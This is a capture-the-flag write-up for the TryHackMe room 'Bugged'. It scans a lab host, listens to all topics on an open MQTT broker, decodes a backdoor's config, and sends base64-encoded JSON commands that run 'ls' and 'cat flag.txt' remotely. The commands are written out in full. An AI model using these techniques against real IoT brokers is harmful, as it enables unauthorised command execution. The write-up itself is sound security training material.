---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Bugged
# DESCRIPTION       . John likes to live in a very Internet connected world. Maybe too connected...
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/bugged
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.32.250 -oN bugged
```

```
PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     $SYS/broker/load/messages/received/15min: 46.47
|     $SYS/broker/messages/received: 980
|     $SYS/broker/publish/bytes/received: 33462
|     $SYS/broker/bytes/received: 46808
|     $SYS/broker/clients/active: 2
|     $SYS/broker/load/bytes/received/5min: 3813.01
|     $SYS/broker/load/messages/sent/1min: 89.91
|     $SYS/broker/load/messages/received/1min: 89.91
|     patio/lights: {"id":4337133154914291862,"color":"PURPLE","status":"OFF"}
|     livingroom/speaker: {"id":3507782125210380749,"gain":44}
|     $SYS/broker/load/messages/received/5min: 79.87
|     $SYS/broker/load/sockets/5min: 0.22
|     $SYS/broker/load/bytes/received/15min: 2219.03
|     $SYS/broker/clients/disconnected: -1
|     $SYS/broker/uptime: 649 seconds
|     $SYS/broker/load/sockets/15min: 0.10
|     $SYS/broker/store/messages/bytes: 305
|     $SYS/broker/messages/sent: 980
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/bytes/sent: 3921
|     $SYS/broker/load/bytes/sent/5min: 319.52
|     $SYS/broker/load/bytes/sent/1min: 359.63
|     $SYS/broker/load/messages/sent/5min: 79.87
|     storage/thermostat: {"id":3523070102871181476,"temperature":23.359861}
|     $SYS/broker/load/messages/sent/15min: 46.47
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/load/bytes/received/1min: 4312.53
|     $SYS/broker/load/bytes/sent/15min: 185.93
|_    $SYS/broker/clients/inactive: -1
```

- After some documentation, I found out that MQTT - MQ Telemetry Transmission Protocol is widely used in IoT devices and runs on a publish-subscription "architecture".

- We see that `nmap` automatically subscribed to some topics, but I wanted to make sure it didn't miss anything, there was nothing standing out for me in the output provided.

```
mosquitto_sub -h 10.10.132.220 -t "#" -v
```

- I used the command above to listen to all topics. 

```
patio/lights {"id":7091344782331867621,"color":"RED","status":"OFF"}
{TRIMMED}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
frontdeck/camera {"id":14205819063353097493,"yaxis":-140.63925,"xaxis":-139.70198,"zoom":3.083472,"movement":true}
livingroom/speaker {"id":7747913053972651785,"gain":45}
{TRIMMED}
storage/thermostat {"id":12634039171116278574,"temperature":23.250414}
```

- Notice the weird looking string ; judging by the character set used and by the padding `==` at the end, this must be base64-encoded. Let's decode it.

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

- We see that we have a `pub_topic` and a `sub_topic`. 

- Let's try listening to them

```
mosquitto_sub -h 10.10.132.220 -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -v
mosquitto_sub -h 10.10.132.220 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -v
```

- No traffic seems to be running through these topics, so I decided to try sending a message myself to both `pub` and `sub` topics while I was listening with the commands above on each of them.

```
mosquitto_pub -h 10.10.132.220 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m 'test'
```

- When publishing to `sub`, I got a reply in the listening `pub` terminal

```
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
```

```
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

- I assume `id` was `cdd1b1c0-1c40-4b0f-8e22-61b357548b7d`,  the ID from the previous command.

- `cmd` should be HELP, CMD and SYS, again, from the previous command.

- `arg` should be the whatever command we want to execute.

- Knowing this, let's try listing the directory

```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```

- Which, after being base64 encoded, turns to 

```
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogImxzIiwgImFyZyI6ICIifQ==
```

- I've sent the command using

```
mosquitto_pub -h "10.10.132.220" -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ=="
```

- And received

```
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9
```

- WHich is

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}
```

- Great. The payload to get the flag is the base64-encoded output of 

```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
```

```
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{redacted}\n"}
```